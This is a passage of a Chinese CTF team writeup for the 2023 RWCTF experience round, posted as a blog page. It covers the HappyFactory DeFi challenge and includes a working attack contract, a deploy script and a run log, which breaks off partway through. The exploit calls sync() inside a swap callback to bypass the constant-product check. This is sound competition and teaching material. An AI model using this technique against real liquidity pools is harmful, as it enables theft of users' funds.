@@ -1,0 +1,824 @@
+<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>2023 RWCTF体验赛 SU Writeup -</title><meta name=description content="本次2023 RWCTF 体验赛 我们 SU 取得了第二名 🥈的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)
+以下是我们 SU 本次 2023 RWCTF的 writeup"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/rwctf-2023-su-wu\/","name":"2023 rwctf体验赛 su writeup"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"2023 RWCTF体验赛 SU Writeup","description":"本次2023 RWCTF 体验赛 我们 SU 取得了第二名 🥈的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770) 以下是我们 SU 本次 2023 RWCTF的 writeup\n","inLanguage":"en","wordCount":1530,"datePublished":"2023-01-10T10:42:00\u002b00:00","dateModified":"2023-01-10T10:42:00\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["RWCTF"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/rwctf-2023-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="2023 RWCTF体验赛 SU Writeup"><meta property="og:description" content="本次2023 RWCTF 体验赛 我们 SU 取得了第二名 🥈的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)
+以下是我们 SU 本次 2023 RWCTF的 writeup"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/rwctf-2023-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="2023 RWCTF体验赛 SU Writeup"><meta name=twitter:description content="本次2023 RWCTF 体验赛 我们 SU 取得了第二名 🥈的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)
+以下是我们 SU 本次 2023 RWCTF的 writeup"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href=https://su-team.cn/css/codeblock.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
+<span class=sr-only>Toggle navigation</span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+</button>
+<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
+<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
+<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
+<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>2023 RWCTF体验赛 SU Writeup</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on January 10, 10010
+&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;8&nbsp;min
+&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;1530&nbsp;words
+&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><ul><li><a href=#happyfactory>HappyFactory</a></li><li><a href=#snake>snake</a></li><li><a href=#be-a-language-expert>Be-a-Language-Expert</a></li><li><a href=#babycurve>babyCurve</a></li><li><a href=#be-a-wiki-hacker>Be-a-Wiki-Hacker</a></li><li><a href=#spring4shell>Spring4Shell</a></li><li><a href=#evil-mysql-server>Evil MySQL Server</a></li><li><a href=#yummy-api>Yummy Api</a></li><li><a href=#be-a-famicom-hacker>Be-a-Famicom-Hacker</a></li><li><a href=#be-a-pk-lpe-master>Be-a-PK-LPE-Master</a></li><li><a href=#be-a-docker-escaper-2>Be-a-Docker-Escaper-2</a></li><li><a href=#digging-into-kernel-3>Digging into Kernel 3</a></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>本次2023 RWCTF 体验赛 我们 SU 取得了第二名 🥈的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href=mailto:suers_xctf@126.com>suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)
+以下是我们 SU 本次 2023 RWCTF的 writeup</p><h2 id=happyfactory>HappyFactory</h2><p>这题的合约类型是DeFi-DEX，由于大多数DEX采用的是恒定乘积自动做市商模型，所以首先看合约代码中是否存在K值校验计算错误的问题，发现不存在这个问题，并且代码基本上正确，第一眼看不出什么异常，于是找到目前链上主流的DEX合约代码来进行对比，发现题目合约代码中关于币对流动性储备值的处理与正常的流程不一致，存在先发送代币后更新储备值的可能，可供我们构造出比原先更低的恒定乘积K值，以绕过滑点问题，使得我们能够通过1A代币交换成1B代币。大致流程是：先换出1B代币给攻击合约账户-回调攻击合约的HappyCall-在HappyCall函数中调用币对流动性的sync函数更新储备值（原先为10:10，现在为10:9）-将1A代币转给币对流动性以增加它的余额值（此时余额值为11：9，能够通过K值校验）-最后将成功换出的1B代币发送给deployer账户。题目的最大坑点在于回调函数名应该为HappyCall而不是代码中给出的KonohaCall，这个要自己调试才能猜出来。</p><p><img src=/img/2023-01-10-RWCTF/1.png alt></p><p>具体的攻击合约代码与脚本如下：
+Hacker.sol:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pragma solidity ^0.8.0;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>import &#34;./Happy.sol&#34;;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>contract Hacker {
+</span></span><span class=line><span class=cl>    address tokenA;
+</span></span><span class=line><span class=cl>    address tokenB;
+</span></span><span class=line><span class=cl>    Greeter greeter;
+</span></span><span class=line><span class=cl>    IHappyFactory factory;
+</span></span><span class=line><span class=cl>    IHappyPair pair;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function hack(address _greeter, address _deployer) public {
+</span></span><span class=line><span class=cl>        greeter = Greeter(address(_greeter));
+</span></span><span class=line><span class=cl>        greeter.airdrop();
+</span></span><span class=line><span class=cl>        tokenA = greeter.tokenA();
+</span></span><span class=line><span class=cl>        tokenB = greeter.tokenB();
+</span></span><span class=line><span class=cl>        (address token0, address token1) = tokenA &lt; tokenB
+</span></span><span class=line><span class=cl>            ? (tokenA, tokenB)
+</span></span><span class=line><span class=cl>            : (tokenB, tokenA);
+</span></span><span class=line><span class=cl>        factory = IHappyFactory(
+</span></span><span class=line><span class=cl>            address(0xA2A21Fe2fD692b63Df06ECd5b0a783323B4eae36)
+</span></span><span class=line><span class=cl>        );
+</span></span><span class=line><span class=cl>        pair = IHappyPair(factory.getPair(token0, token1));
+</span></span><span class=line><span class=cl>        if (token0 == tokenA) {
+</span></span><span class=line><span class=cl>            pair.swap(0, 1 ether, address(this), new bytes(1));
+</span></span><span class=line><span class=cl>        } else {
+</span></span><span class=line><span class=cl>            pair.swap(1 ether, 0, address(this), new bytes(1));
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>        IERC20(tokenB).transfer(_deployer, 1 ether);
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function HappyCall(
+</span></span><span class=line><span class=cl>        address sender,
+</span></span><span class=line><span class=cl>        uint256 amount0,
+</span></span><span class=line><span class=cl>        uint256 amount1,
+</span></span><span class=line><span class=cl>        bytes calldata data
+</span></span><span class=line><span class=cl>    ) external {
+</span></span><span class=line><span class=cl>        pair.sync();
+</span></span><span class=line><span class=cl>        IERC20(tokenA).transfer(address(pair), 1 ether);
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function isSolved() public view returns (bool) {
+</span></span><span class=line><span class=cl>        return greeter.isSolved();
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p><code>solve.py:</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Poseidon.Blockchain</span> <span class=kn>import</span> <span class=o>*</span>  <span class=c1># https://github.com/B1ue1nWh1te/Poseidon</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>[+] deployer account: 0xD1262D03B3F0f5aE0bDC8AB007C5D73E6036f848
+</span></span></span><span class=line><span class=cl><span class=s1>[+] token: v4.local.iqGxZZzAduEwBUPqYyWhHXMZFbItLHsM6CDjlu_ihI-4d1eS0xp0nONWaHotJBLcZiJsDlp2WUJr9cNLjbByKhzzr7ZE-Ayf49_AWdrs5yFj8c_qzsdVfrsVzr2U9IQMs6UtHZ38qCzFiLLx3hkIAGqMKCIVGWwhzF9quU3tOi1Kuw
+</span></span></span><span class=line><span class=cl><span class=s1>[+] contract address: 0xc615a812208f7F380019C5fA442f6dcEE7F41B32
+</span></span></span><span class=line><span class=cl><span class=s1>[+] flag: rwctf</span><span class=si>{mVsdeUeKM6jU4myiTCsoQhpdjTKxJmRM}</span><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 连接至链</span>
+</span></span><span class=line><span class=cl><span class=n>chain</span> <span class=o>=</span> <span class=n>Chain</span><span class=p>(</span><span class=s2>&#34;http://118.31.7.155:8545&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 创建新账户</span>
+</span></span><span class=line><span class=cl><span class=n>AccountAddress</span><span class=p>,</span> <span class=n>AccountPrivateKey</span> <span class=o>=</span> <span class=n>BlockchainUtils</span><span class=o>.</span><span class=n>CreateNewAccount</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 领取测试币</span>
+</span></span><span class=line><span class=cl><span class=k>assert</span><span class=p>(</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=s2>&#34;http://118.31.7.155:8080/api/claim&#34;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;address&#34;</span><span class=p>:</span> <span class=n>AccountAddress</span><span class=p>})</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 等待一段时间以便测试币发放得到区块确认</span>
+</span></span><span class=line><span class=cl><span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>10</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 导入账户</span>
+</span></span><span class=line><span class=cl><span class=n>account</span> <span class=o>=</span> <span class=n>Account</span><span class=p>(</span><span class=n>chain</span><span class=p>,</span> <span class=n>AccountPrivateKey</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 选择 Solidity 版本</span>
+</span></span><span class=line><span class=cl><span class=n>BlockchainUtils</span><span class=o>.</span><span class=n>SwitchSolidityVersion</span><span class=p>(</span><span class=s2>&#34;0.8.0&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 编译攻击合约</span>
+</span></span><span class=line><span class=cl><span class=n>abi</span><span class=p>,</span> <span class=n>bytecode</span> <span class=o>=</span> <span class=n>BlockchainUtils</span><span class=o>.</span><span class=n>Compile</span><span class=p>(</span><span class=s2>&#34;Hacker.sol&#34;</span><span class=p>,</span> <span class=s2>&#34;Hacker&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 部署攻击合约</span>
+</span></span><span class=line><span class=cl><span class=n>hacker</span> <span class=o>=</span> <span class=n>account</span><span class=o>.</span><span class=n>DeployContract</span><span class=p>(</span><span class=n>abi</span><span class=p>,</span> <span class=n>bytecode</span><span class=p>)[</span><span class=s2>&#34;Contract&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 开始攻击</span>
+</span></span><span class=line><span class=cl><span class=n>_greeter</span> <span class=o>=</span> <span class=s2>&#34;0xc615a812208f7F380019C5fA442f6dcEE7F41B32&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>_deployer</span> <span class=o>=</span> <span class=s2>&#34;0xD1262D03B3F0f5aE0bDC8AB007C5D73E6036f848&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>hacker</span><span class=o>.</span><span class=n>CallFunction</span><span class=p>(</span><span class=s2>&#34;hack&#34;</span><span class=p>,</span> <span class=n>_greeter</span><span class=p>,</span> <span class=n>_deployer</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 查看解出状态</span>
+</span></span><span class=line><span class=cl><span class=n>hacker</span><span class=o>.</span><span class=n>ReadOnlyCallFunction</span><span class=p>(</span><span class=s2>&#34;isSolved&#34;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>运行日志：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>2023-01-07 22:54:28.246 | SUCCESS  | Poseidon.Blockchain:__init__:37 - 
+</span></span><span class=line><span class=cl>[Chain][Connect]Successfully connected to [http://118.31.7.155:8545]. [Delay] 104 ms
+</span></span><span class=line><span class=cl>2023-01-07 22:54:28.443 | SUCCESS  | Poseidon.Blockchain:GetBasicInformation:55 - 
+</span></span><span class=line><span class=cl>[Chain][GetBasicInformation]
+</span></span><span class=line><span class=cl>[ChainId]1712
+</span></span><span class=line><span class=cl>[BlockNumber]65067
+</span></span><span class=line><span class=cl>[GasPrice]1 Gwei
+</span></span><span class=line><span class=cl>[ClientVersion]Geth/v1.10.17-stable-25c9b49f/linux-amd64/go1.18
+</span></span><span class=line><span class=cl>2023-01-07 22:54:28.460 | SUCCESS  | Poseidon.Blockchain:CreateNewAccount:705 - 
+</span></span><span class=line><span class=cl>[BlockchainUtils][CreateNewAccount]
+</span></span><span class=line><span class=cl>[Address]0x4109F583C2e0916a5972d567cC32A78fc20503aC
+</span></span><span class=line><span class=cl>[PrivateKey]0x7c0d75837f8ee639a66475c2ffa833f24f65e81d512609dcab8d5ba76f576807
+</span></span><span class=line><span class=cl>2023-01-07 22:54:38.557 | SUCCESS  | Poseidon.Blockchain:__init__:230 - 
+</span></span><span class=line><span class=cl>[Account][Import]Successfully import account [0x4109F583C2e0916a5972d567cC32A78fc20503aC].
+</span></span><span class=line><span class=cl>2023-01-07 22:54:38.607 | SUCCESS  | Poseidon.Blockchain:GetBalance:108 - 
+</span></span><span class=line><span class=cl>[Chain][GetBalance][0x4109F583C2e0916a5972d567cC32A78fc20503aC]
+</span></span><span class=line><span class=cl>[1000000000000000000 Wei]&lt;=&gt;[1 Ether]
+</span></span><span class=line><span class=cl>信息: 用提供的模式无法找到文件。
+</span></span><span class=line><span class=cl>2023-01-07 22:54:38.849 | SUCCESS  | Poseidon.Blockchain:SwitchSolidityVersion:657 - 
+</span></span><span class=line><span class=cl>[BlockchainUtils][SwitchSolidityVersion]Current Version: 0.8.0
+</span></span><span class=line><span class=cl>2023-01-07 22:54:39.447 | SUCCESS  | Poseidon.Blockchain:Compile:687 - 
+</span></span><span class=line><span class=cl>[BlockchainUtils][Compile]
+</span></span><span class=line><span class=cl>[FileCourse]Hacker.sol
+</span></span><span class=line><span class=cl>[ContractName]Hacker
+</span></span><span class=line><span class=cl>[ABI][{&#39;inputs&#39;: [{&#39;internalType&#39;: &#39;address&#39;, &#39;name&#39;: &#39;sender&#39;, &#39;type&#39;: &#39;address&#39;}, {&#39;internalType&#39;: &#39;uint256&#39;, &#39;name&#39;: &#39;amount0&#39;, &#39;type&#39;: &#39;uint256&#39;}, {&#39;internalType&#39;: &#39;uint256&#39;, &#39;name&#39;: &#39;amount1&#39;, &#39;type&#39;: &#39;uint256&#39;}, {&#39;internalType&#39;: &#39;bytes&#39;, &#39;name&#39;: &#39;data&#39;, &#39;type&#39;: &#39;bytes&#39;}], &#39;name&#39;: &#39;HappyCall&#39;, &#39;outputs&#39;: [], &#39;stateMutability&#39;: &#39;nonpayable&#39;, &#39;type&#39;: &#39;function&#39;}, {&#39;inputs&#39;: [{&#39;internalType&#39;: &#39;address&#39;, &#39;name&#39;: &#39;_greeter&#39;, &#39;type&#39;: &#39;address&#39;}, {&#39;internalType&#39;: &#39;address&#39;, &#39;name&#39;: &#39;_deployer&#39;, &#39;type&#39;: &#39;address&#39;}], &#39;name&#39;: &#39;hack&#39;, &#39;outputs&#39;: [], &#39;stateMutability&#39;: &#39;nonpayable&#39;, &#39;type&#39;: &#39;function&#39;}, {&#39;inputs&#39;: [], &#39;name&#39;: 